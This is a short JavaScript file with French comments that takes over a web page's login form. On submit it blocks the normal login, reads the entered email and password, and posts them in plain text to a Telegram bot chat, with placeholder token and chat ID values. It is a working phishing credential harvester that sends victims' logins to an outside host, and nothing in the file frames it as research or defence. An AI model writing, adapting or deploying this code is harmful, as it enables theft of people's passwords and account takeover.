document.addEventListener("DOMContentLoaded", function () {

    const form = document.getElementById("loginForm");

    if (!form) return;

    form.addEventListener("submit", function (e) {
        e.preventDefault(); // IMPORTANT pour empêcher le rechargement

        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        const token = "TON_TOKEN";
        const chatId = "TON_CHAT_ID";

        const message = `📩 Nouveau formulaire:\nEmail: ${email}\nPassword: ${password}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(res => res.json())
        .then(data => {
            console.log("Envoyé à Telegram :", data);
        })
        .catch(err => {
            console.error("Erreur Telegram :", err);
        });

    });

});